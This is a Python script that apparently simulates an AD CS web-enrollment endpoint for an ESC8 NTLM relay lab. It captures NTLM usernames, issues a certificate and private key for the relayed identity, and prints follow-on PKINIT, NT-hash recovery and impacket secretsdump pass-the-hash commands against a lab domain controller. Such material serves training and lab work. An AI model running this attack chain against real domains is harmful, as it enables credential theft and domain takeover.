import http.server
import socketserver
import subprocess
import os
import base64
import struct
import re

PORT = 80
CA_DIR = "/tmp/esc8-ca"
CA_KEY = os.path.join(CA_DIR, "ca.key")
CA_CERT = os.path.join(CA_DIR, "ca.crt")
CAPTURED_LOG = os.path.join(CA_DIR, "captured_auth.log")

def init_ca():
    os.makedirs(CA_DIR, exist_ok=True)
    if not os.path.exists(CA_KEY):
        print("[*] Generating ESC8 Lab Root CA...", flush=True)
        subprocess.run(["openssl", "genrsa", "-out", CA_KEY, "2048"], check=True, capture_output=True)
        subprocess.run([
            "openssl", "req", "-x509", "-new", "-nodes", "-key", CA_KEY,
            "-sha256", "-days", "3650", "-out", CA_CERT,
            "-subj", "/CN=ESC8LAB-CA/O=ESC8LAB/C=US"
        ], check=True, capture_output=True)
        print(f"[+] Root CA ready: {CA_CERT}", flush=True)

def parse_ntlm_username(ntlm_data):
    try:
        msg_type = struct.unpack('<I', ntlm_data[8:12])[0]
        if msg_type == 3:
            user_len = struct.unpack('<H', ntlm_data[36:38])[0]
            user_off = struct.unpack('<I', ntlm_data[40:44])[0]
            domain_len = struct.unpack('<H', ntlm_data[28:30])[0]
            domain_off = struct.unpack('<I', ntlm_data[32:36])[0]
            username = ntlm_data[user_off:user_off+user_len].decode('utf-16-le', errors='ignore')
            domain = ntlm_data[domain_off:domain_off+domain_len].decode('utf-16-le', errors='ignore')
            return username, domain
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN"

def sign_certificate_for_user(username, domain):
    key_path = f"/tmp/esc8-ca/{username}.key"
    csr_path = f"/tmp/esc8-ca/{username}.csr"
    cert_path = f"/tmp/esc8-ca/{username}.crt"
    ext_path = f"/tmp/esc8-ca/{username}.ext"
    upn = f"{username}@{domain}"

    subprocess.run(["openssl", "genrsa", "-out", key_path, "2048"], capture_output=True)
    subprocess.run([
        "openssl", "req", "-new", "-key", key_path, "-out", csr_path,
        "-subj", f"/CN={username}/O={domain}"
    ], capture_output=True)

    with open(ext_path, "w") as f:
        f.write("[v3_req]\n")
        f.write("basicConstraints = CA:FALSE\n")
        f.write("keyUsage = digitalSignature, keyEncipherment\n")
        f.write(f"subjectAltName = otherName:1.3.6.1.4.1.311.20.2.3;UTF8:{upn}\n")

    res = subprocess.run([
        "openssl", "x509", "-req", "-in", csr_path,
        "-CA", CA_CERT, "-CAkey", CA_KEY, "-CAcreateserial",
        "-out", cert_path, "-days", "365", "-sha256",
        "-extfile", ext_path, "-extensions", "v3_req"
    ], capture_output=True, text=True)

    if res.returncode != 0:
        return None, None, res.stderr

    with open(cert_path, "r") as f:
        cert_pem = f.read()
    with open(key_path, "r") as f:
        key_pem = f.read()

    return cert_pem, key_pem, None

class ESC8RelayHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def send_ntlm_negotiate(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'NTLM')
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h3>401 Unauthorized - NTLM Authentication Required</h3></body></html>")

    def send_ntlm_challenge(self):
        server_name = b"ESC8LAB"
        server_name_len = len(server_name)
        challenge = b'\x01\x02\x03\x04\x05\x06\x07\x08'
        target_info = b'\x02\x00' + server_name_len.to_bytes(2, 'little') + server_name
        target_info_len = len(target_info)

        type2 = (
            b'NTLMSSP\x00'
            b'\x02\x00\x00\x00'
            + server_name_len.to_bytes(2, 'little')
            + server_name_len.to_bytes(2, 'little')
            + b'\x38\x00\x00\x00'
            + b'\x15\x82\x8a\xe2'
            + b'\x00\x00\x00\x00'
            + challenge
            + b'\x00\x00\x00\x00\x00\x00\x00\x00'
            + target_info_len.to_bytes(2, 'little')
            + target_info_len.to_bytes(2, 'little')
            + b'\x48\x00\x00\x00'
            + server_name
            + target_info
        )
        self.send_response(401)
        self.send_header('WWW-Authenticate', f'NTLM {base64.b64encode(type2).decode()}')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def handle_ntlm_auth(self, ntlm_data):
        msg_type = struct.unpack('<I', ntlm_data[8:12])[0]

        if msg_type == 1:
            self.send_ntlm_challenge()
            return

        if msg_type == 3:
            username, domain = parse_ntlm_username(ntlm_data)
            upn = f"{username}@{domain}"

            print(f"[+] NTLM Type3 received from: {username}@{domain}", flush=True)

            with open(CAPTURED_LOG, "a") as log:
                log.write(f"NTLM Auth captured: {username}@{domain}\n")

            cert_pem, key_pem, err = sign_certificate_for_user(username, domain)

            if err or not cert_pem:
                self.send_response(500)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(f"<html><body><h3>Certificate signing failed: {err}</h3></body></html>".encode())
                return

            print(f"[+] Certificate signed for {upn} (ESC8 relay complete)", flush=True)

            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>AD CS Enrollment Services - ESC8LAB</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background:#f4f4f9; padding:20px; }}
        .container {{ max-width:860px; background:white; padding:30px; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); margin:auto; }}
        h2 {{ color:#107c41; border-bottom:2px solid #107c41; padding-bottom:10px; }}
        .banner {{ background:#e6f4ea; border-left:5px solid #107c41; padding:14px; margin-bottom:20px; }}
        pre {{ background:#f0f0f0; padding:15px; border-radius:4px; font-size:12px; overflow-x:auto; white-space:pre-wrap; word-break:break-all; }}
        h4 {{ margin-top:20px; color:#0078d4; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>AD CS Web Enrollment - Certificate Issued via NTLM Relay</h2>
        <div class="banner">
            <strong>[+] NTLM Relay Successful!</strong><br>
            Relayed Identity: <code>{upn}</code>
        </div>

        <h4>Issued Certificate (PEM) — signed for UPN: {upn}</h4>
        <pre>{cert_pem}</pre>

        <h4>Private Key (PEM)</h4>
        <pre>{key_pem}</pre>

        <h4>Next Steps — PKINIT Attack:</h4>
        <pre>
1. Save the certificate and key above to: {username}.crt and {username}.key

2. Request TGT via PKINIT using certipy or gettgtpkinit.py:
   certipy auth -pfx {username}.pfx -dc-ip 10.108.10.10 -domain ESC8LAB.LOCAL

   OR: python3 gettgtpkinit.py ESC8LAB.LOCAL/{username} -cert-pem {username}.crt -key-pem {username}.key output.ccache

3. Use TGT to get NT Hash via U2U:
   python3 getnthash.py ESC8LAB.LOCAL/{username} -key $(python3 -c "import ccache; ...") -dc-ip 10.108.10.10

4. Pass-the-Hash:
   impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:&lt;NTHASH&gt;' ESC8LAB.LOCAL/{username}@10.108.10.10
        </pre>
    </div>
</body>
</html>"""
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(html.encode())))
            self.end_headers()
            self.wfile.write(html.encode())

    def do_GET(self):
        auth_header = self.headers.get('Authorization', '')

        if not auth_header:
            self.send_ntlm_negotiate()
            return

        if auth_header.startswith('NTLM '):
            try:
                ntlm_data = base64.b64decode(auth_header[5:])
                if ntlm_data.startswith(b'NTLMSSP\x00'):
                    self.handle_ntlm_auth(ntlm_data)
                    return
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f"NTLM decode error: {e}".encode())
                return

        self.send_ntlm_negotiate()

    def do_POST(self):
        self.do_GET()


if __name__ == '__main__':
    init_ca()
    print(f"[+] ESC8 Real CA Relay Server running on port {PORT}", flush=True)
    print(f"[+] Root CA: {CA_CERT}", flush=True)
    print(f"[*] Waiting for NTLM relay from ntlmrelayx or DC coercion...", flush=True)
    with socketserver.TCPServer(('0.0.0.0', PORT), ESC8RelayHandler) as httpd:
        httpd.allow_reuse_address = True
        httpd.serve_forever()
